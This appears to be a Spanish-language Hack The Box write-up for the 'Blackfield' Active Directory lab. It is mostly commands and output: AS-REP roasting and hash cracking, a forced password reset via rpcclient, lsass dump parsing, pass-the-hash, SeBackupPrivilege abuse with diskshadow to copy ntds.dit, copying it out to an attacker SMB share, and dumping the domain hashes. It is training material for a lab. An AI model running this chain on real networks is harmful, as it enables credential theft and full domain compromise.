---
title: HackTheBox - Blackfield
published: true
---


## [](#header-2)Fase de reconocimiento

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.192 -oG ports

nmap -sCV -p<ports> 10.10.10.192 -oN scanports

- `Puertos abiertos, por donde se puede atacar`

  - puerto 88 -> kerberos
  - puerto 445 -> smb
  - puerto 5985 -> winrm
  - puerto 389 -> ldap

- `Primero vamos a enumerar el puerto smb`

        smbclient -L \\\\10.10.10.192\\
        Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        profiles$       Disk
        SYSVOL          Disk      Logon server share

- `Tambien lo podemos enumerar con smbmap`

        smbmap -H 10.10.10.192 -u "null"
        [+] Guest session       IP: 10.10.10.192:445    Name: 10.10.10.192
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
- 
        smbmap -H 10.10.10.192 "null" -r profiles$

de esta manera podemos ver mas informacion (en las carpetas que tenemos privilegios)
en la carpeta profiles$ vamos a encontrar mas de 300 usurios del dominio pero hay
que ver cuales son validas con el `DC (Domain Controller)`

- Vamos a validar estos usuarios con kerbrute

        smbmap -H 10.10.10.192 -u "null" -r profiles$ | awk 'NF {print $NF}' > users 

este oneliner nos va a volcar solo la parte de los usuarios y nos va a guardar
en users.txt

## [](header-2)Kerbrute

Esta herramienta es de impacket o tambien lo pueden bajar desde el repositorio de ropnop en github

        kerbrute -user users.txt -dc-ip 10.10.10.192 -domain blackfield.local 

        Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

        [*] Valid user => audit2020
        [*] Valid user => support [NOT PREAUTH]
        [*] Valid user => svc_backup
        [*] No passwords were discovered :'(

tenemos 3 usuarios validos del dominio

## [](header-2)ASREPRoast Attack

       GetNPUsers.py blackfield.local/ -no-pass -usersfile users.valid

       Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

       [-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
       $krb5asrep$23$support@BLACKFIELD.LOCAL:59e765a5b5479d524b397f80a2c4dc2b
       $ae069138d2d70f706a8b5df2a13b0ac2782c946bd771ce82da9fc2483ecdd807e7a487
       78b3076d74fbf3984389758a56b7c1e85fb2860ee9e8b2
       [-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set

y logramos visualizar un hash que podemos crackear con john the ripper

## [](header-2)Cracking Hash

      john --wordlist=/usr/share/wordlists/rockyou.txt hash
      Using default input encoding: UTF-8
      Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
      Press 'q' or Ctrl-C to abort, almost any other key for status
      #00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
      1g 0:00:01:37 DONE (2023-03-08 14:04) 0.01025g/s 147055p/s 147055c/s 147055C/s #00p3r..#+*=%
      Use the "--show" option to display all of the cracked passwords reliably
      Session completed.

y tuvimos exito en romper el hash -> support:#00^BlackKnight

- Verificamos que la contraseña obtenida sea valida

      crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight'
      SMB    10.10.10.192    445    DC01     [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local)
      SMB    10.10.10.192    445    DC01     [+] BLACKFIELD.local\suppoort:#00^BlackKnight

      ES VALIDA!!!

## [](header-2)Enumeracion con credenciales validas

     rpcclient -U "support%#00^BlackKnight" 10.10.10.192
     rpcclient $> enumdomusers
     rpcclient $> enumdomgroups
     rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
     rpcclient $> queryuser 0x1f4 -> de esta manera podemos enumerar gran parte de los usuarios del dominio

tenemos contraseñas validas pero no nos podemos conectar de manera remota a la maquina, en este caso vamos a
utilizar una herramienta muy conocida en este campo de AD que es el famoso Bloodhound. La mayoria de las 
veces se corre bloodhound una vez dentro de la maquina pero en esta vamos a hacerlo con bloodhound-python

## [](header-2)Bloodhound-Python

    bloodhound-python -c all -u 'support' -p '#00^BlackKnight' -ns 10.10.10.192 -dc dc01.blackfield.local -d blackfield.local


## [](header-2)Iniciando neo4j & bloodhound

    neo4j console
    bloodhound

- Una vez dentro de bloodhound vamos a cargar toda la data que nos volco bloodhound-python, esto nos
respresentara de manera grafica las rutas por donde debemos entrar o atacar y convertirnos en administradores
del dominio

1. Find Shortest Paths to Domain Admins
2. Find Paths from Kerberoastable Users
3. Find AS-REP Roastable Users

- vemos que el usuario support es asreproasteable. Le damos un clic derecho al usuario y lo seteamos a Mark User as Owned.
Vamos a Node Info y miramos donde hay 1. Vemos que el usuario support puede forzar un cambio de contraseña al usuario audit2020 -> es decir que tiene privilegios
sobre la maquina audit2020

no tenemos acceso a la maquina pero existe un metodo para cambiar la contraseña por 

    net rpc password -> o con rpcclient
    rpcclient -U "support%#00^BlackKnight" 10.10.10.192
    rpcclient $> setuserinfo2 audit2020 24 atreus123!

rapidamente lo validamos con crackmapexec

    crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'atreus123!'
    SMB    10.10.10.192    445    DC01    [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) 
    SMB    10.10.10.192    445    DC01    [+] BLACKFIELD.local\audit2020:atreus123!

ya tenemos credenciales validas de audit2020 -> atreus123! asique en este punto vamos a enumerar 
las carpetas que contiene el usuario audit2020

    smbmap -H 10.10.10.192 -u 'audit2020' -p 'atreus123!'
    [+] IP: 10.10.10.192:445        Name: dc01.blackfield.local
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                READ ONLY       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share

ya tenemos acceso a la carpeta forensic

    smbmap -H 10.10.10.192 -u 'audit2020' -p 'atreus123!' -r forensic
    [+] IP: 10.10.10.192:445        Name: dc01.blackfield.local
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        forensic                                                READ ONLY
        .\forensic\*
        dr--r--r--                0 Sun Feb 23 12:10:16 2020    .
        dr--r--r--                0 Sun Feb 23 12:10:16 2020    ..
        dr--r--r--                0 Sun Feb 23 15:14:37 2020    commands_output
        dr--r--r--                0 Thu May 28 17:29:24 2020    memory_analysis
        dr--r--r--                0 Fri Feb 28 19:30:34 2020    tools

    smbmap -H 10.10.10.192 -u 'audit2020' -p 'atreus123!' -r forensic/memory_analysis
    [+] IP: 10.10.10.192:445        Name: dc01.blackfield.local
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        forensic                                                READ ONLY
        .\forensicmemory_analysis\*
        dr--r--r--                0 Thu May 28 17:29:24 2020    .
        dr--r--r--                0 Thu May 28 17:29:24 2020    ..
        fr--r--r--         37876530 Thu May 28 17:29:24 2020    conhost.zip
        fr--r--r--         24962333 Thu May 28 17:29:24 2020    ctfmon.zip
        fr--r--r--         23993305 Thu May 28 17:29:24 2020    dfsrs.zip
        fr--r--r--         18366396 Thu May 28 17:29:24 2020    dllhost.zip
        fr--r--r--          8810157 Thu May 28 17:29:24 2020    ismserv.zip
        fr--r--r--         41936098 Thu May 28 17:29:24 2020    lsass.zip
        fr--r--r--         64288607 Thu May 28 17:29:24 2020    mmc.zip
        fr--r--r--         13332174 Thu May 28 17:29:24 2020    RuntimeBroker.zip
        fr--r--r--        131983313 Thu May 28 17:29:24 2020    ServerManager.zip
        fr--r--r--         33141744 Thu May 28 17:29:24 2020    sihost.zip
        fr--r--r--         33756344 Thu May 28 17:29:24 2020    smartscreen.zip
        fr--r--r--         14408833 Thu May 28 17:29:24 2020    svchost.zip
        fr--r--r--         34631412 Thu May 28 17:29:24 2020    taskhostw.zip
        fr--r--r--         14255089 Thu May 28 17:29:24 2020    winlogon.zip
        fr--r--r--          4067425 Thu May 28 17:29:24 2020    wlms.zip
        fr--r--r--         18303252 Thu May 28 17:29:24 2020    WmiPrvSE.zip

lsass.zip nos llama la atencion porque hay una utilidad pypykatz con la cual podriamos ver informacion relevante
dumpeada a nivel de memoria. Esto quiere decir que anteriormente esta maquina ya a sido pwneada por alguien

    smbmap -H 10.10.10.192 -u 'audit2020' -p 'atreus123!' --download forensic/memory_analysis/lsass.zip

        [+] Starting download: forensic\memory_analysis\lsass.zip (41936098 bytes)
        [+] File output to: /home/atreus/HTB/blackfield/content/10.10.10.192-forensic_memory_analysis_lsass.zip

## [](#header-2)pypykatz (anteriormente extraimos lo que existe en lsass.zip)

unzipeamos el lsass.zip para despues dumpear el contenido con pypykatz

    pypykatz lsa minidump lsass.DMP

    INFO:pypykatz:Parsing file lsass.DMP
    FILE: ======== lsass.DMP =======
    == LogonSession ==
    authentication_id 406458 (633ba)
    session_id 2
    username svc_backup
    domainname BLACKFIELD
    logon_server DC01
    logon_time 2020-02-23T18:00:03.423728+00:00
    sid S-1-5-21-4194615774-2175524697-3563712290-1413
    luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)

tenemos hashes NT que nos sirve para realizar PassTheHash sin proporcionar contraseña en texto claro

- HASH NT del usuario svc_backup 

9658d1d1dcd9250115e2205d9f48400d tambien obtuvimos el NT del usuario Admin del dominio
pero son invalidas, ahora vamos a validar el NT del usuario svc_backup

## [](#header-2)SHELL svc_backup

    crackmapexec smb 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
    SMB     10.10.10.192    445    DC01    [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
    SMB     10.10.10.192    445    DC01    [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d

el hash NT es correcto, sirve para conectarnos a la maquina y conseguir una sesion remota de comandos

## [](#header-2)Vamos a comprobar con winrm

    crackmapexec winrm 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'

    SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
    HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
    WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)

y nos muestra un Pwned!! esto quiere decir que podemos conectarnos con evil-winrm

    evil-winrm -i blackfield.local -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'

    Evil-WinRM shell v3.4

    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

    Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

    Info: Establishing connection to remote endpoint

    *Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
     blackfield\svc_backup

esta seria la primera parte de la maquina, tenemos ejecucion remota de comandos y ya podemos ver la flag
(user.txt) esta ubicada en 

    C:\Users\svc_backup\Desktop\users.txt

## [](#header-2)Escalada de Privilegios

*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

    PRIVILEGES INFORMATION
    ----------------------

    Privilege Name                Description                    State
    ============================= ============================== =======
    SeMachineAccountPrivilege     Add workstations to domain     Enabled
    SeBackupPrivilege             Back up files and directories  Enabled
    SeRestorePrivilege            Restore files and directories  Enabled
    SeShutdownPrivilege           Shut down the system           Enabled
    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

una vez dentro de la maquina vamos a fijarnos en cual de todos los grupos se encuentra svc_backup
net user svc_backup -> Backup Operators es un grupo predeterminado de Windows que esta diseñado para respaldar
y restaurar archivos en la pc usando ciertos metodos para leer y escribir todos los archivos del sistema

    *Evil-WinRM* PS C:\> net user svc_backup

## [](##header-2)SeBackupPrivilege

Teniendo este privilegio, podriamos hacer una copia (backup) de seguridad de elemento del sistema como el NTDS que nos permitiria 
recuperar los hashes de los usuarios del sistema, entre ellos el usuario Administrator.
Es un privilegio avanzado de Windows que se otorga a cuentas especificas que tienen permiso para realizar copias
de seguridad y restauracion de archivos y carpetas. Este privilegio se utiliza comunmente en aplicaciones de copia de 
seguridad y restauracion.

el repositorio SeBackupPrivilege.github tiene un buen conjunto de herramientas PowerShell y tendremos que subir
2 archivos a la maquina

    upload /home/atreus/HTB/blackfield/content/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
    upload /home/atreus/HTB/blackfield/content/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdUtils.dll

y vamos a importar los 2 

    import-module .\SeBackupPrivilegeCmdLets.dll
    import-module .\SeBackupPrivilegeCmdUtils.dll

ahora podemos leer archivos en todo el sistema por ejemplo no podemos leer el netlogon.dns
pero podemos copiarlo y leerlo

    *Evil-WinRM* PS C:\Windows\System32\config> Copy-FileSeBackupPrivilege netlogon.dns \Windows\Temp\netlogon.dns
    *Evil-WinRM* PS C:\Windows\System32\config> cd C:\Windows\Temp

lastimosamente no podemos leer el root.txt y leer la flag de la maquina pero...
podemos buscar y tomar el ntds.dit la base de datos en el DC que contiene todos los hash
de contraseñas. Desafortunadamente no lo podemos agarrar porque esta en uso.

## [](##header-2)Dump SAM & SYSTEM

    reg save HKLM\system system
    reg save HKLM\sam sam

- SAM -> es una base de datos que almacena informacion de cuentas de usuario y grupos locales en un sistema Windows

- SYSTEM -> se refiere a la cuenta de sistema que ejecuta servicios y procesos en una sistema operativo Windows

en conclusion trabajan juntos para autenticar y autorizar el acceso de usuarios y grupos a recursos en la red.
`SAM` almacena informacion de cuentas de usuario y grupos locales, mientras que `SYSTEM` asegura que los servicios y
procesos que requieren privilegios de sistema se ejecuten de manera segura.


## [](##header-2)DISKSHADOW.EXE 

es una herramienta de linea de comandos incluida en Windows que se utiliza para crear y administrar
instantaneas de volumen, tambien conocidas como instataneas de volumen de sombra. Es util para realizar copias de 
seguridad de datos y para proteger la integridad de los datos al permitir la recuperacion de datos en caso de perdida
o daño. Tambien puede ser utilizado para realizar tareas de copia de archivos

- Creando un volumen sombra con Diskshadow.exe 

       set context persistent nowriters

1. este comando crea un contexto de copia de seguridad persistente sin escritores

       add volume c: alias atreus

2. esto crea el volumen que deseamos sombrear en este caso la unidad C:\

       create

3. crear la unidad logica

       expose %atreus% z:

4. esto va a facilitar el acceso a los recursos compartidos con el alias que asignamos

- este archivo text.txt lo subimos a la maquina en C:\Windows\Temp

       set context persistent nowriters
       add volume c: alias atreus
       create
       expose %atreus%
 
## [](##header-2)Ejecucion de text.txt Diskshadow.exe 

    diskshadow.exe /s c:\Windows\Temp\text.txt

con esto ya podemos ingresar a la unidad logica z:\ que anteriormente creamos
y vamos a poder ver todos los archivos de la maquina

    dir z:\  
    dir z:\Windows\NTDS\
    robocopy /b z:\Windows\NTDS\ . ntds.dit y con esto ya tendriamos el ntds.dit

no pude descargarme los archivos ntds.dit system sam por evil-winrm, asique me los transferi a mi 
maquina con smbserver

    impacket-smbserver smbFolder $(pwd) -smb2support -> desde mi maquina de atacante
    copy ntds.dit \\10.10.X.X\smbFolder\ntds.dit -> desde la maquina victima comprometida
    copy sam \\10.10.X.X\smbFolder\sam
    copy system \\10.10.X.X\smbFolder\system

## [](##header-2)Dump hashes NTDS y Shell ROOT

    impacket-secretsdump.py -system system -ntds ntds.dit LOCAL  

nos va a dumpear todos los hashes para realizar PASSTHEHASH

    Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

    [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Searching for pekList, be patient
    [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
    [*] Reading and decrypting hashes from ntds.dit 
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DC01$:1000:aad3b435b51404eeaad3b435b51404ee:2a2f8ac26db968c93a17fefdb36c38ee:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
    audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
    support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::

## [](##header-2)Validacion de Hash con Crackmapexec

    crackmapexec smb 10.10.10.192 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'
    SMB    10.10.10.192  445  DC01   [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
    SMB    10.10.10.192  445  DC01   [+] BLACKFIELD.local\Administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)

## [](##header-2)Winrm Pass The Hash Administrator

    evil-winrm -i blackfield.local -u 'Administrator' -H '<HASH>'






































